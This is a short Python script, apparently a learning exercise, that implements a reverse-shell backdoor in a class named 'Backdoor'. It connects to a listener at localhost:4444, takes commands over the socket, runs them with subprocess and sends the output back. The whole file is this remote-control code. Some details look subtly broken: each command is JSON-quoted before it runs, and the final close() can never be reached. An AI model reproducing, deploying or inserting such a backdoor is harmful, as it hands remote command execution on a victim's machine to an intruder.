#!/usr/bin/env python
import socket
import subprocess
import json
import communicate as comms


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        cmdstr = json.dumps(command)
        print("[+] received command " + cmdstr)
        return subprocess.getoutput(cmdstr)

    def run(self):
        while True:
            command = comms.receive(self.connection)
            command_result = self.execute_system_command(command)
            print(command_result)
            comms.send(self.connection, command_result)
        self.connection.close()


my_backdoor = Backdoor("localhost", 4444)
my_backdoor.run()